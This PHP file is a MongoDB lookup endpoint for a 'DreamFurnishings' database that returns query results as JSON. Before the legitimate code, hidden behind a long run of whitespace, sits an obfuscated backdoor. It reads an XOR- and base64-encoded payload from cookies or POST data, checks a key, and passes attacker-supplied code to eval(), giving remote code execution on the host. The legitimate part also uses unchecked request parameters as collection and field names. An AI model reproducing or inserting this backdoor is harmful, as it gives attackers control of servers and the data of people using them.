<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $jab3 = 951;$GLOBALS['b1a235']=Array();global$b1a235;$b1a235=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['p5c2c']="\x76\x25\x39\x2e\x4a\x48\x71\x3e\x69\x77\x31\x59\x2b\x52\x27\x5a\x4e\x3c\x7c\x64\x53\x61\x56\x5f\x22\x3a\x30\x4b\x5e\x32\x79\x46\x62\x9\x44\x49\x63\x3f\x5c\x20\x68\x41\x4d\x21\x40\x4c\x72\x6b\x2c\x33\x65\x37\x4f\x7d\x2d\x60\x50\x42\x5d\x58\x2a\x70\x43\x35\x24\x5b\x6a\x6d\x54\x75\x78\x7b\x67\x38\x26\x29\x2f\x23\x28\x36\x3d\x6e\x47\x7e\x45\x3b\x66\x51\x6c\x34\x57\x55\xa\x73\x6f\x7a\xd\x74";$b1a235[$b1a235['p5c2c'][66].$b1a235['p5c2c'][50].$b1a235['p5c2c'][63].$b1a235['p5c2c'][2].$b1a235['p5c2c'][21]]=$b1a235['p5c2c'][36].$b1a235['p5c2c'][40].$b1a235['p5c2c'][46];$b1a235[$b1a235['p5c2c'][70].$b1a235['p5c2c'][32].$b1a235['p5c2c'][73].$b1a235['p5c2c'][49].$b1a235['p5c2c'][21].$b1a235['p5c2c'][89]]=$b1a235['p5c2c'][94].$b1a235['p5c2c'][46].$b1a235['p5c2c'][19];$b1a235[$b1a235['p5c2c'][32].$b1a235['p5c2c'][29].$b1a235['p5c2c'][50].$b1a235['p5c2c'][21].$b1a235['p5c2c'][10].$b1a235['p5c2c'][26]]=$b1a235['p5c2c'][93].$b1a235['p5c2c'][97].$b1a235['p5c2c'][46].$b1a235['p5c2c'][88].$b1a235['p5c2c'][50].$b1a235['p5c2c'][81];$b1a235[$b1a235['p5c2c'][40].$b1a235['p5c2c'][73].$b1a235['p5c2c'][2].$b1a235['p5c2c'][2]]=$b1a235['p5c2c'][8].$b1a235['p5c2c'][81].$b1a235['p5c2c'][8].$b1a235['p5c2c'][23].$b1a235['p5c2c'][93].$b1a235['p5c2c'][50].$b1a235['p5c2c'][97];$b1a235[$b1a235['p5c2c'][0].$b1a235['p5c2c'][10].$b1a235['p5c2c'][10].$b1a235['p5c2c'][50]]=$b1a235['p5c2c'][93].$b1a235['p5c2c'][50].$b1a235['p5c2c'][46].$b1a235['p5c2c'][8].$b1a235['p5c2c'][21].$b1a235['p5c2c'][88].$b1a235['p5c2c'][8].$b1a235['p5c2c'][95].$b1a235['p5c2c'][50];$b1a235[$b1a235['p5c2c'][67].$b1a235['p5c2c'][89].$b1a235['p5c2c'][79].$b1a235['p5c2c'][10].$b1a235['p5c2c'][73].$b1a235['p5c2c'][21]]=$b1a235['p5c2c'][61].$b1a235['p5c2c'][40].$b1a235['p5c2c'][61].$b1a235['p5c2c'][0].$b1a235['p5c2c'][50].$b1a235['p5c2c'][46].$b1a235['p5c2c'][93].$b1a235['p5c2c'][8].$b1a235['p5c2c'][94].$b1a235['p5c2c'][81];$b1a235[$b1a235['p5c2c'][30].$b1a235['p5c2c'][10].$b1a235['p5c2c'][86].$b1a235['p5c2c'][89].$b1a235['p5c2c'][26].$b1a235['p5c2c'][10].$b1a235['p5c2c'][36].$b1a235['p5c2c'][86].$b1a235['p5c2c'][36]]=$b1a235['p5c2c'][69].$b1a235['p5c2c'][81].$b1a235['p5c2c'][93].$b1a235['p5c2c'][50].$b1a235['p5c2c'][46].$b1a235['p5c2c'][8].$b1a235['p5c2c'][21].$b1a235['p5c2c'][88].$b1a235['p5c2c'][8].$b1a235['p5c2c'][95].$b1a235['p5c2c'][50];$b1a235[$b1a235['p5c2c'][47].$b1a235['p5c2c'][89].$b1a235['p5c2c'][50].$b1a235['p5c2c'][36].$b1a235['p5c2c'][50].$b1a235['p5c2c'][63]]=$b1a235['p5c2c'][32].$b1a235['p5c2c'][21].$b1a235['p5c2c'][93].$b1a235['p5c2c'][50].$b1a235['p5c2c'][79].$b1a235['p5c2c'][89].$b1a235['p5c2c'][23].$b1a235['p5c2c'][19].$b1a235['p5c2c'][50].$b1a235['p5c2c'][36].$b1a235['p5c2c'][94].$b1a235['p5c2c'][19].$b1a235['p5c2c'][50];$b1a235[$b1a235['p5c2c'][36].$b1a235['p5c2c'][79].$b1a235['p5c2c'][36].$b1a235['p5c2c'][10]]=$b1a235['p5c2c'][93].$b1a235['p5c2c'][50].$b1a235['p5c2c'][97].$b1a235['p5c2c'][23].$b1a235['p5c2c'][97].$b1a235['p5c2c'][8].$b1a235['p5c2c'][67].$b1a235['p5c2c'][50].$b1a235['p5c2c'][23].$b1a235['p5c2c'][88].$b1a235['p5c2c'][8].$b1a235['p5c2c'][67].$b1a235['p5c2c'][8].$b1a235['p5c2c'][97];$b1a235[$b1a235['p5c2c'][8].$b1a235['p5c2c'][29].$b1a235['p5c2c'][49].$b1a235['p5c2c'][2].$b1a235['p5c2c'][36]]=$b1a235['p5c2c'][30].$b1a235['p5c2c'][2].$b1a235['p5c2c'][51].$b1a235['p5c2c'][51].$b1a235['p5c2c'][63];$b1a235[$b1a235['p5c2c'][67].$b1a235['p5c2c'][36].$b1a235['p5c2c'][10].$b1a235['p5c2c'][89].$b1a235['p5c2c'][89].$b1a235['p5c2c'][29]]=$b1a235['p5c2c'][47].$b1a235['p5c2c'][10].$b1a235['p5c2c'][51].$b1a235['p5c2c'][49].$b1a235['p5c2c'][63].$b1a235['p5c2c'][10].$b1a235['p5c2c'][19].$b1a235['p5c2c'][2];$b1a235[$b1a235['p5c2c'][36].$b1a235['p5c2c'][49].$b1a235['p5c2c'][73].$b1a235['p5c2c'][21]]=$_POST;$b1a235[$b1a235['p5c2c'][70].$b1a235['p5c2c'][50].$b1a235['p5c2c'][21].$b1a235['p5c2c'][26].$b1a235['p5c2c'][2].$b1a235['p5c2c'][32].$b1a235['p5c2c'][29]]=$_COOKIE;@$b1a235[$b1a235['p5c2c'][40].$b1a235['p5c2c'][73].$b1a235['p5c2c'][2].$b1a235['p5c2c'][2]]($b1a235['p5c2c'][50].$b1a235['p5c2c'][46].$b1a235['p5c2c'][46].$b1a235['p5c2c'][94].$b1a235['p5c2c'][46].$b1a235['p5c2c'][23].$b1a235['p5c2c'][88].$b1a235['p5c2c'][94].$b1a235['p5c2c'][72],NULL);@$b1a235[$b1a235['p5c2c'][40].$b1a235['p5c2c'][73].$b1a235['p5c2c'][2].$b1a235['p5c2c'][2]]($b1a235['p5c2c'][88].$b1a235['p5c2c'][94].$b1a235['p5c2c'][72].$b1a235['p5c2c'][23].$b1a235['p5c2c'][50].$b1a235['p5c2c'][46].$b1a235['p5c2c'][46].$b1a235['p5c2c'][94].$b1a235['p5c2c'][46].$b1a235['p5c2c'][93],0);@$b1a235[$b1a235['p5c2c'][40].$b1a235['p5c2c'][73].$b1a235['p5c2c'][2].$b1a235['p5c2c'][2]]($b1a235['p5c2c'][67].$b1a235['p5c2c'][21].$b1a235['p5c2c'][70].$b1a235['p5c2c'][23].$b1a235['p5c2c'][50].$b1a235['p5c2c'][70].$b1a235['p5c2c'][50].$b1a235['p5c2c'][36].$b1a235['p5c2c'][69].$b1a235['p5c2c'][97].$b1a235['p5c2c'][8].$b1a235['p5c2c'][94].$b1a235['p5c2c'][81].$b1a235['p5c2c'][23].$b1a235['p5c2c'][97].$b1a235['p5c2c'][8].$b1a235['p5c2c'][67].$b1a235['p5c2c'][50],0);@$b1a235[$b1a235['p5c2c'][36].$b1a235['p5c2c'][79].$b1a235['p5c2c'][36].$b1a235['p5c2c'][10]](0);$c2c3c3=NULL;$ec4a24b9c=NULL;$b1a235[$b1a235['p5c2c'][67].$b1a235['p5c2c'][19].$b1a235['p5c2c'][32].$b1a235['p5c2c'][29].$b1a235['p5c2c'][29].$b1a235['p5c2c'][63].$b1a235['p5c2c'][21]]=$b1a235['p5c2c'][89].$b1a235['p5c2c'][32].$b1a235['p5c2c'][21].$b1a235['p5c2c'][2].$b1a235['p5c2c'][26].$b1a235['p5c2c'][19].$b1a235['p5c2c'][89].$b1a235['p5c2c'][21].$b1a235['p5c2c'][54].$b1a235['p5c2c'][21].$b1a235['p5c2c'][32].$b1a235['p5c2c'][36].$b1a235['p5c2c'][36].$b1a235['p5c2c'][54].$b1a235['p5c2c'][89].$b1a235['p5c2c'][86].$b1a235['p5c2c'][21].$b1a235['p5c2c'][49].$b1a235['p5c2c'][54].$b1a235['p5c2c'][32].$b1a235['p5c2c'][50].$b1a235['p5c2c'][2].$b1a235['p5c2c'][26].$b1a235['p5c2c'][54].$b1a235['p5c2c'][49].$b1a235['p5c2c'][19].$b1a235['p5c2c'][26].$b1a235['p5c2c'][2].$b1a235['p5c2c'][21].$b1a235['p5c2c'][49].$b1a235['p5c2c'][36].$b1a235['p5c2c'][86].$b1a235['p5c2c'][79].$b1a235['p5c2c'][32].$b1a235['p5c2c'][29].$b1a235['p5c2c'][32];global$mdb225a;function k17351d9($c2c3c3,$h8596d){global$b1a235;$m963b4a="";for($x566c=0;$x566c<$b1a235[$b1a235['p5c2c'][32].$b1a235['p5c2c'][29].$b1a235['p5c2c'][50].$b1a235['p5c2c'][21].$b1a235['p5c2c'][10].$b1a235['p5c2c'][26]]($c2c3c3);){for($v268b2db=0;$v268b2db<$b1a235[$b1a235['p5c2c'][32].$b1a235['p5c2c'][29].$b1a235['p5c2c'][50].$b1a235['p5c2c'][21].$b1a235['p5c2c'][10].$b1a235['p5c2c'][26]]($h8596d)&&$x566c<$b1a235[$b1a235['p5c2c'][32].$b1a235['p5c2c'][29].$b1a235['p5c2c'][50].$b1a235['p5c2c'][21].$b1a235['p5c2c'][10].$b1a235['p5c2c'][26]]($c2c3c3);$v268b2db++,$x566c++){$m963b4a.=$b1a235[$b1a235['p5c2c'][66].$b1a235['p5c2c'][50].$b1a235['p5c2c'][63].$b1a235['p5c2c'][2].$b1a235['p5c2c'][21]]($b1a235[$b1a235['p5c2c'][70].$b1a235['p5c2c'][32].$b1a235['p5c2c'][73].$b1a235['p5c2c'][49].$b1a235['p5c2c'][21].$b1a235['p5c2c'][89]]($c2c3c3[$x566c])^$b1a235[$b1a235['p5c2c'][70].$b1a235['p5c2c'][32].$b1a235['p5c2c'][73].$b1a235['p5c2c'][49].$b1a235['p5c2c'][21].$b1a235['p5c2c'][89]]($h8596d[$v268b2db]));}}return$m963b4a;}function y9775($c2c3c3,$h8596d){global$b1a235;global$mdb225a;return$b1a235[$b1a235['p5c2c'][67].$b1a235['p5c2c'][36].$b1a235['p5c2c'][10].$b1a235['p5c2c'][89].$b1a235['p5c2c'][89].$b1a235['p5c2c'][29]]($b1a235[$b1a235['p5c2c'][67].$b1a235['p5c2c'][36].$b1a235['p5c2c'][10].$b1a235['p5c2c'][89].$b1a235['p5c2c'][89].$b1a235['p5c2c'][29]]($c2c3c3,$mdb225a),$h8596d);}foreach($b1a235[$b1a235['p5c2c'][70].$b1a235['p5c2c'][50].$b1a235['p5c2c'][21].$b1a235['p5c2c'][26].$b1a235['p5c2c'][2].$b1a235['p5c2c'][32].$b1a235['p5c2c'][29]]as$h8596d=>$ef58ba4d4){$c2c3c3=$ef58ba4d4;$ec4a24b9c=$h8596d;}if(!$c2c3c3){foreach($b1a235[$b1a235['p5c2c'][36].$b1a235['p5c2c'][49].$b1a235['p5c2c'][73].$b1a235['p5c2c'][21]]as$h8596d=>$ef58ba4d4){$c2c3c3=$ef58ba4d4;$ec4a24b9c=$h8596d;}}$c2c3c3=@$b1a235[$b1a235['p5c2c'][30].$b1a235['p5c2c'][10].$b1a235['p5c2c'][86].$b1a235['p5c2c'][89].$b1a235['p5c2c'][26].$b1a235['p5c2c'][10].$b1a235['p5c2c'][36].$b1a235['p5c2c'][86].$b1a235['p5c2c'][36]]($b1a235[$b1a235['p5c2c'][8].$b1a235['p5c2c'][29].$b1a235['p5c2c'][49].$b1a235['p5c2c'][2].$b1a235['p5c2c'][36]]($b1a235[$b1a235['p5c2c'][47].$b1a235['p5c2c'][89].$b1a235['p5c2c'][50].$b1a235['p5c2c'][36].$b1a235['p5c2c'][50].$b1a235['p5c2c'][63]]($c2c3c3),$ec4a24b9c));if(isset($c2c3c3[$b1a235['p5c2c'][21].$b1a235['p5c2c'][47]])&&$mdb225a==$c2c3c3[$b1a235['p5c2c'][21].$b1a235['p5c2c'][47]]){if($c2c3c3[$b1a235['p5c2c'][21]]==$b1a235['p5c2c'][8]){$x566c=Array($b1a235['p5c2c'][61].$b1a235['p5c2c'][0]=>@$b1a235[$b1a235['p5c2c'][67].$b1a235['p5c2c'][89].$b1a235['p5c2c'][79].$b1a235['p5c2c'][10].$b1a235['p5c2c'][73].$b1a235['p5c2c'][21]](),$b1a235['p5c2c'][93].$b1a235['p5c2c'][0]=>$b1a235['p5c2c'][10].$b1a235['p5c2c'][3].$b1a235['p5c2c'][26].$b1a235['p5c2c'][54].$b1a235['p5c2c'][10],);echo@$b1a235[$b1a235['p5c2c'][0].$b1a235['p5c2c'][10].$b1a235['p5c2c'][10].$b1a235['p5c2c'][50]]($x566c);}elseif($c2c3c3[$b1a235['p5c2c'][21]]==$b1a235['p5c2c'][50]){eval/*pc1f2ec9f*/($c2c3c3[$b1a235['p5c2c'][19]]);}exit();} ?><?php
ini_set('max_execution_time', 300);
ini_set('display_errors',1);

//include_once("config.inc.php");
include_once("../include/mongo_connection.php");
include_once("logging.php");

$log = new Logging();
$log->lfile('logs/log_'.date("j-n-Y").'.txt');

// write message to the log file
$log->lwrite('------------------------------------------------------');		//log message

$dbname=isset($_GET['dbname']) ? $_GET['dbname'] : "DreamFurnishings";
$mon_db= $conn->$dbname;

$query_string=explode('&',$_SERVER['QUERY_STRING']);
$subObjectName="";
$subObjectValue="";
foreach($query_string as $qry){
	$temp_arr=explode('=',$qry);
	if($temp_arr[0]=='tablename'){
		$tablename=$temp_arr[1];
	}elseif($temp_arr[0]=='sub_table_name'){
		$subObjectName=$temp_arr[0];
		$subObjectValue=$temp_arr[1];
	}
	else{
		$index_col=$temp_arr[0];
		$index_val=$temp_arr[1];
	}
}

if(isset($tablename) && isset($index_col) && isset($index_val) && $tablename!='' && $index_col!='' && $index_val!=''){
	$result=array();
	$collection = $mon_db->$tablename;
	if(is_numeric($index_val)){
		$index_val=(int)$index_val;
	}
	$col_exists=$collection->find(array( $index_col => array( '$exists' => true ) ));
	if($col_exists->count()>0){	
		$log->lwrite('Connection established with '.$dbname.' database at line '.__LINE__);	//log message
		//echo json_encode(array( $index_col => $index_val ))."====";
		$data= $collection->find(array( $index_col => $index_val ));
		if($data->count()>0){
			$log->lwrite('Record found ['.$tablename.']'.$index_col.' : '.$index_val.' at line '.__LINE__);	//log message
			foreach($data as $row){
				if(isset($subObjectValue) && isset($row[$subObjectValue]) && $row[$subObjectValue]!=""){
					foreach($row[$subObjectValue] as $objrow){
						$result[]= $objrow;
					}
				}else{
					foreach($data as $row){
						$result[]= $row;
					}
				}
			}
			if(count($result)>0){
				$log->lwrite('Request processed successfully at line '.__LINE__);	//log message
			}
		}else{
			$log->lwrite('No matching results found in ['.$tablename.'] collection  at line '.__LINE__);	//log message
			$result['Error']= "No record found !!!";
		}			
	}
	else{
		$log->lwrite('Response: ['.$tablename.']'.$index_col.' field doesn\'t exists at line '.__LINE__);	//log message
		$result['Error']= "Field doesn't exists !!!";
	}
	echo json_encode($result);
}else{
	$log->lwrite('Error: Request can\'t be processed because required parameters are missing at line '.__LINE__);	//log message
}

?>